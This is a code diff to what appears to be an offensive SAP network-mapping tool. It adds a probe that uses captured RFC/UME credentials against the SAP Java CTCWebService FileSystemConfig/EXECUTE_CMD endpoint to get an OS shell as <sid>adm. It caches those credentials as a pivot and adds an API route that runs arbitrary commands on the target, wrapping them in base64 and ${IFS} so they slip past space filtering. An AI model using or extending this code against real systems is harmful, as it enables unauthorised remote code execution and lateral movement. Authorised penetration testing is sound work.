@@ -8954,6 +8954,8 @@ def create_app(api: SAPMAPApi) -> Bottle:
                         _osx = int(_sc_result.get("osexec_access", -1))
                         conn.logon_successful = (_osx == 1)
                         conn.os_exec_verified = (_osx == 1)
+                        if _osx == 1:
+                            conn.os_exec_channel = "sapcontrol"
                         # Stage 3 result (OS hint from uname probe).
                         # Cached on the connection so subsequent
                         # OSExecute calls pick the right shell wrap
@@ -9235,6 +9237,141 @@ def create_app(api: SAPMAPApi) -> Bottle:
                                   f"accepted on {_label} target")
                             if _tgt:
                                 _tgt.has_critical_finding = True
+                            # CTCWebService pivot probe.  A live UME
+                            # credential with Administrator role
+                            # unlocks /CTCWebService/CTCWebServiceBean
+                            # FileSystemConfig/EXECUTE_CMD → shell as
+                            # <sid>adm on the Java stack's HTTP port.
+                            # Skip BTP / ADS — those aren't standard
+                            # NetWeaver Java stacks and don't expose
+                            # CTCWebService.  Basic-auth succeeded
+                            # here so we know rfc_user / rfc_pwd are
+                            # good; the probe just confirms the UME
+                            # role and endpoint availability.
+                            if (_target_is_java
+                                    and not _target_is_btp
+                                    and not _is_ads):
+                                print(f"[*] {dest_name}: CTCWebService "
+                                      f"auth probe on {conn.http_url} "
+                                      f"as {rfc_user}...")
+                                try:
+                                    import sap_java_ctcws as _cws
+                                    _cws_r = _cws.ctcws_auth_probe(
+                                        conn.http_url, rfc_user, rfc_pwd,
+                                        timeout=10.0)
+                                except Exception as _e:
+                                    _cws_r = {"ok": False,
+                                              "status": 0,
+                                              "error": f"probe crashed: {_e}",
+                                              "os_exec_verified": False}
+                                if _cws_r.get("os_exec_verified"):
+                                    conn.os_exec_verified = True
+                                    conn.os_exec_channel = "ctcws"
+                                    _oh = (_cws_r.get("os_hint")
+                                            or "").strip()
+                                    if _oh:
+                                        conn.target_os_hint = _oh
+                                    print(f"[+] {dest_name}: "
+                                          f"CTCWebService OSExecute "
+                                          f"unlocked — shell as "
+                                          f"<sid>adm via "
+                                          f"FileSystemConfig/"
+                                          f"EXECUTE_CMD")
+                                    if _tgt:
+                                        # Backfill os_type from the
+                                        # uname line the probe parsed.
+                                        _os_name = (
+                                            _cws_r.get("os_name")
+                                            or "").strip()
+                                        if (_os_name
+                                                and not (_tgt.os_type
+                                                          or "").strip()):
+                                            _tgt.os_type = _os_name
+                                            print(f"[+] {dest_name}: "
+                                                  f"backfilled "
+                                                  f"{conn.target_sid}"
+                                                  f".os_type = "
+                                                  f"{_os_name!r} "
+                                                  f"from CTCWebService "
+                                                  f"uname probe")
+                                        # A pure placeholder can land
+                                        # here with system_type='' —
+                                        # nudge it toward JAVA so the
+                                        # Java-only menu items become
+                                        # visible.
+                                        _cur_stack = (
+                                            _tgt.system_type
+                                            or "").upper()
+                                        if "JAVA" not in _cur_stack:
+                                            _tgt.system_type = (
+                                                f"{_cur_stack}+JAVA"
+                                                if _cur_stack else "JAVA")
+                                            print(f"[+] {dest_name}: "
+                                                  f"backfilled "
+                                                  f"{conn.target_sid}"
+                                                  f".system_type → "
+                                                  f"{_tgt.system_type!r} "
+                                                  f"(CTCWebService "
+                                                  f"confirms Java "
+                                                  f"stack)")
+                                        _tgt.has_critical_finding = True
+                                    # Cache pivot on target node so
+                                    # execute_os_command routes
+                                    # transparently — mirrors the
+                                    # SAPControl pivot pattern.
+                                    if conn.target_sid:
+                                        _tgt_cache = api.state.get_node(
+                                            conn.target_sid)
+                                        if _tgt_cache is not None:
+                                            _tgt_cache._cached_ctcws_pivot = {
+                                                "url": conn.http_url or "",
+                                                "user": rfc_user,
+                                                "password": rfc_pwd,
+                                                "os_hint": (
+                                                    conn.target_os_hint
+                                                    or ""),
+                                                "via_destination": (
+                                                    conn.destination_name),
+                                                "via_source_sid": (
+                                                    conn.source_sid),
+                                            }
+                                            print(f"[+] {dest_name}: "
+                                                  f"cached CTCWebService "
+                                                  f"pivot on "
+                                                  f"{conn.target_sid} — "
+                                                  f"downstream OS-exec "
+                                                  f"now routes via "
+                                                  f"{conn.http_url}")
+                                    if conn.target_sid:
+                                        try:
+                                            emit_finding(
+                                                "CRITICAL",
+                                                conn.source_sid,
+                                                f"RFC destination "
+                                                f"{dest_name!r} unlocks "
+                                                f"OS shell as {rfc_user} "
+                                                f"on {conn.target_sid} "
+                                                f"via CTCWebService "
+                                                f"FileSystemConfig/"
+                                                f"EXECUTE_CMD — full "
+                                                f"kernel-level pivot",
+                                                meta={
+                                                  "source_sid":
+                                                    conn.source_sid,
+                                                  "target_sid":
+                                                    conn.target_sid,
+                                                  "channel": "ctcws"},
+                                            )
+                                        except Exception:
+                                            pass
+                                else:
+                                    _st = _cws_r.get("status") or "?"
+                                    _er = (_cws_r.get("error")
+                                            or "no error text")[:140]
+                                    print(f"[-] {dest_name}: "
+                                          f"CTCWebService probe did "
+                                          f"not unlock OS-exec "
+                                          f"(HTTP {_st}: {_er})")
                         elif _ba.get("ok"):
                             print(f"[-] {dest_name}: HTTP "
                                   f"{_ba['status']} — credential "
@@ -9970,6 +10107,131 @@ def create_app(api: SAPMAPApi) -> Bottle:
         else:
             print(f"[-] {dest_name}: OSExecute failed — "
                   f"{result['error'][:200]}")
+        return json.dumps(result)
+
+    @app.route("/api/node/<sid>/ctcws_osexecute", method="POST")
+    def node_ctcws_osexecute(sid):
+        """Run an OS command via CTCWebService/FileSystemConfig on the
+        target of an HTTP destination whose UME credentials we've
+        already verified (conn.os_exec_verified=True, os_exec_channel=
+        'ctcws').  Synchronous — the SOAP call blocks until the child
+        process exits (server-side timeout provided by the operator,
+        defaults 30s).  CTCWebService runs the command through the
+        Java stack's Runtime.exec, so shell wrapping matches the same
+        rules the SAPControl endpoint uses.
+
+        Payload:
+          { destination_name: str, command: str, timeout?: int }
+        Returns:
+          { ok, exit_code, output, error, status, pid, command_sent }
+        """
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        data = request.json or {}
+        dest_name = (data.get("destination_name") or "").strip()
+        command = (data.get("command") or "").strip()
+        timeout = int(data.get("timeout") or 30)
+        if not dest_name:
+            return json.dumps({"error": "destination_name required"})
+        if not command:
+            return json.dumps({"error": "command required"})
+        conn = None
+        for c in api.state.get_connections_from(sid):
+            if c.destination_name == dest_name:
+                conn = c
+                break
+        if not conn:
+            return json.dumps({"error": f"connection {dest_name} not "
+                                          f"found on {sid}"})
+        if getattr(conn, "os_exec_channel", "") != "ctcws":
+            return json.dumps({"error": (f"connection {dest_name} is "
+                                            f"not a CTCWebService pivot "
+                                            f"(os_exec_channel="
+                                            f"{getattr(conn, 'os_exec_channel', '')!r})")})
+        if not conn.os_exec_verified:
+            return json.dumps({"error": (f"connection {dest_name} has "
+                                            f"not been verified — run "
+                                            f"Test Connection first so "
+                                            f"os_exec_verified is set")})
+        pwd = conn.secstore_password or ""
+        user = conn.rfc_user or ""
+        if not (user and pwd and conn.http_url):
+            return json.dumps({"error": (f"connection {dest_name} is "
+                                            f"missing url / user / "
+                                            f"password")})
+        # CTCWebService/FileSystemConfig/EXECUTE_CMD passes the arg
+        # to java.lang.Runtime.exec(String) which tokenises on
+        # whitespace before spawning the child.  Same failure modes
+        # as SAPControl OSExecute — reuse the same shell-wrap logic
+        # so absolute paths run verbatim, bare command names get
+        # PATH resolution, and pipelines / redirects stay intact.
+        target_os = ""
+        if conn.target_sid:
+            tgt = api.state.get_node(conn.target_sid)
+            if tgt:
+                target_os = (tgt.os_type or "").lower()
+        hint = (conn.target_os_hint or "").lower()
+        if hint == "windows":
+            is_windows = True
+        elif hint == "unix":
+            is_windows = False
+        else:
+            is_windows = (
+                any(w in target_os for w in ("windows", "nt", "win"))
+                or user.lower().startswith("sapservice")
+            )
+        already_wrapped = (
+            command.startswith(("sh ", "bash ", "/bin/sh ",
+                                 "/bin/bash "))
+            or command.startswith(("cmd ", "cmd.exe ",
+                                    "powershell "))
+            or command.startswith(("/", "c:\\", "C:\\"))
+        )
+        raw_safe = (
+            not any(c in command for c in " \t|&<>$`\"'\\")
+        )
+        cmd_is_absolute = (
+            command.startswith(("/",))
+            or (len(command) >= 3
+                and command[0].isalpha()
+                and command[1:3] == ":\\")
+        )
+        if raw_safe and cmd_is_absolute:
+            already_wrapped = True
+        raw_cmd = command
+        if not already_wrapped:
+            if is_windows:
+                raw_cmd = f"cmd.exe /C {command}"
+            else:
+                import base64 as _b64
+                b64 = _b64.b64encode(
+                    command.encode("utf-8")).decode("ascii")
+                raw_cmd = (f"/bin/sh -c "
+                           f"echo${{IFS}}{b64}|base64${{IFS}}"
+                           f"-d|/bin/sh")
+        print(f"[*] {dest_name}: CTCWebService exec on {conn.http_url} "
+              f"as {user} → command={command[:60]!r} "
+              f"(timeout={timeout}s, "
+              f"target_os={'windows' if is_windows else 'unix'})")
+        try:
+            import sap_java_ctcws as _cws
+            result = _cws.ctcws_os_execute(
+                conn.http_url, user, pwd, raw_cmd,
+                timeout=float(timeout))
+        except Exception as _e:
+            result = {"ok": False, "status": 0,
+                      "error": f"CTCWebService call crashed: {_e}",
+                      "exit_code": -1, "output": "", "pid": 0}
+        result["command_sent"] = raw_cmd
+        if result.get("ok"):
+            print(f"[+] {dest_name}: CTCWebService rc="
+                  f"{result.get('exit_code')} "
+                  f"({len(result.get('output') or '')} bytes output)")
+        else:
+            print(f"[-] {dest_name}: CTCWebService exec failed — "
+                  f"{(result.get('error') or '')[:200]}")
         return json.dumps(result)
 
     @app.route("/api/node/<sid>/exec_command", method="POST")
